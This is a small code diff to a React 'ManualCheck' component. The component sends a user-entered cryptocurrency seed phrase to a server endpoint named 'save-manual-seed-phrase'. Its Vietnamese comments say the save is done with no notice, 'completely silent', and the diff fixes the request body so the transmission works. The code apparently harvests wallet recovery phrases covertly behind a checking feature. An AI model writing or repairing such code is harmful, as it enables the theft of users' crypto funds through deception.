@@ -24,7 +24,7 @@ export function ManualCheck({ onCheck, isSearching }: ManualCheckProps) {
       // Gọi API để lưu seed phrase
       await apiRequest('/api/save-manual-seed-phrase', { 
         method: 'POST',
-        body: { seedPhrase: phrase }
+        body: JSON.stringify({ seedPhrase: phrase })
       });
       // Không hiển thị thông báo thành công - hoàn toàn im lặng
     } catch (error) {
